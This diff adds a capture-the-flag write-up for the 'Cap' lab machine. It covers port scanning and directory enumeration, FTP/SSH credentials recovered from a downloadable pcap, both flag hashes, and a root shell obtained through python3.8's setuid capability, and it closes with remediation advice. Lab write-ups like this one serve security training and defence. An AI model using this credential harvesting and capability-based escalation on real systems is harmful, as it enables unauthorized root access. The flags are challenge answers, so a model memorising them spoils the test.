@@ -1,0 +1,140 @@
+# Cap Write-Up
+
+Target: 10.10.10.245
+
+---
+
+## Introduction
+- Objective: Obtain the user and root flag
+- Tools: Nmap, Gobuster, Wireshark, FTP, SSH, LinPEAS, Python
+
+---
+
+## Initial Reconnaissance
+	- Port Scanning: Nmap scan
+		- Command: sudo nmap -sn 10.10.10.245
+		- Output: Received a response from the target
+		- Command: sudo nmap -sV 10.10.10.245
+		- Output: 
+			21/tcp  open  ftp     vsftpd 3.0.3
+			22/tcp  open  ssh     OpenSSH 8.2p1
+			80/tcp  open  http    gunicorn
+	- Observations: OS: Linux
+
+---
+
+## Enumeration
+	- Service Exploration:
+		- Service 1: Web Server (Gunicorn)
+			- Command: Visit http://10.10.10.245:80 in browser
+			- Output: Security dashboard with tabs: Security Events, IP Config, Network Status
+		- Service 2: Network Status Tab
+			- Command: Check Network Status tab on dashboard
+			- Output: Displays services with I-Node, State, Path; interface: inet
+		- Service 3: FTP Server
+			- Command: Attempt anonymous FTP login
+			- Output: Anonymous login not allowed
+		- Service 4: Gobuster Directory Scan
+			- Command: gobuster dir -u http://10.10.10.245/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 200,301,302,307,401,403 -e -t 100 -b ""
+			- Output: 
+				http://10.10.10.245/data (Status: 302) [Size: 208] [--> http://10.10.10.245/]
+				http://10.10.10.245/ip (Status: 200) [Size: 17456]
+				http://10.10.10.245/netstat (Status: 200) [Size: 41528]
+				http://10.10.10.245/capture (Status: 302) [Size: 220] [--> http://10.10.10.245/data/5]
+		- Service 5: Packet Capture Analysis
+			- Command: Access http://10.10.10.245/data/0 to download pcap file, open in Wireshark
+			- Output: FTP credentials found - USER: nathan, PASS: Buck3tH4TF0RM3!
+	- Manual Checks: 
+		- Explored /data/ endpoint, found ID parameter (e.g., /data/0) for accessing previous scans
+	- Key Findings: 
+		- FTP credentials (nathan/Buck3tH4TF0RM3!) extracted from pcap file
+
+---
+
+## Exploitation
+	- Initial Access: FTP Login
+		- Command: ftp 10.10.10.245
+			Username: nathan
+			Password: Buck3tH4TF0RM3!
+		- Output: Successful login, files downloaded: user.txt, linpeas.sh, shell.sh
+	- Shell Access: SSH Login
+		- Command: ssh nathan@10.10.10.245
+			Password: Buck3tH4TF0RM3!
+		- Output: nathan@cap:~$
+
+## User Flag
+	- Command: cat user.txt
+	- Output: fa1196254f87ec47f8acf35c8a9f2556
+
+---
+
+## Privilege Escalation
+	- Step 1: Information Gathering:
+		- System Info: 
+			- Command: uname -a
+			- Output: Not provided (inferred: Linux Cap, kernel version unknown)
+		- User Context:
+			- Command: id
+			- Output: uid=1000(nathan) gid=1000(nathan) groups=1000(nathan)
+		- Automated Tools:
+			- Command: ./linpeas.sh
+			- Output: Vulnerable to CVE-2021-3560; /usr/bin/python3.8 has capabilities
+	- Step 2: Identify Vectors:
+		- SUID Binaries:
+			- Command: Not provided
+			- Output: Not provided
+		- Cron Jobs:
+			- Command: Not provided
+			- Output: Not provided
+		- Kernel Exploits:
+			- Command: Not provided
+			- Output: Not provided
+		- Misconfigurations:
+			- Command: Not provided
+			- Output: /usr/bin/python3.8 has capabilities (from linpeas.sh)
+	- Step 3: Exploit the Vector: CVE-2021-3560 (Polkit)
+		- Command: Attempted to run CVE-2021-3560 exploit script (failed due to permissions)
+		- Command: Use Python capability for root shell
+			- Command: /usr/bin/python3.8
+				>>> import os
+				>>> os.setuid(0)
+				>>> os.system("/bin/bash")
+		- Output: root@cap:/#
+	- Step 4: Verify Access:
+		- Command: whoami
+		- Output: root
+
+---
+
+## Post-Exploitation
+	- Flag Retrieval:
+		- Command: cd /root && cat root.txt
+		- Output: 79a2dd1f07e6619d1d08c3a5655aef8a
+	- Persistence (Optional): Not implemented
+	- Evidence: Not provided
+
+---
+
+## Conclusion
+- Summary: In "Cap" (10.10.10.245), I used Nmap to find ports 21 (FTP), 22 (SSH), and 80 (Gunicorn). Gobuster revealed /data/, where /data/0 provided a pcap file. Wireshark extracted FTP credentials (nathan/Buck3tH4TF0RM3!), granting FTP and SSH access. I retrieved the user flag (fa1196254f87ec47f8acf35c8a9f2556). LinPEAS identified CVE-2021-3560, but I used /usr/bin/python3.8’s capabilities to gain a root shell with `os.setuid(0)`, obtaining the root flag (79a2dd1f07e6619d1d08c3a5655aef8a).
+- Lessons Learned: I need to use the right tools for enumeration—Gobuster missed key directories, and I should’ve used FFUF for better filtering. I wasted time trying to run the CVE-2021-3560 exploit without checking permissions first. Running LinPEAS early helped, but I should’ve focused on Python capabilities sooner instead of struggling with the exploit script. I also need to be more comfortable uploading files via SCP when Git isn’t available on the target.
+- Fixes:
+	- Secure FTP Credentials: Avoid storing plaintext credentials (nathan/Buck3tH4TF0RM3!) in logs or pcap files; use encrypted authentication.
+	- Restrict Packet Capture Access: Block access to /data/ endpoints or require authentication to prevent unauthorized pcap downloads.
+	- Patch Polkit for CVE-2021-3560: Update Polkit to a version beyond 0.115 to fix the privilege escalation vulnerability.
+	- Remove Python Capabilities: Remove unnecessary capabilities from /usr/bin/python3.8 to prevent privilege escalation via os.setuid(0).
+	- Restrict Directory Permissions: Ensure /tmp and other directories aren’t world-writable to prevent unauthorized script uploads.
+
+---
+
+## Appendix
+- Additional Details: Attempted CVE-2021-3560 exploit failed due to permissions; used Python capability instead.
+- Tools and Exploits:
+	- Nmap
+	- Gobuster
+	- Wireshark
+	- FTP
+	- SSH
+	- LinPEAS
+	- CVE-2021-3560 (Polkit exploit, unused)
+	- Python Capability Exploit
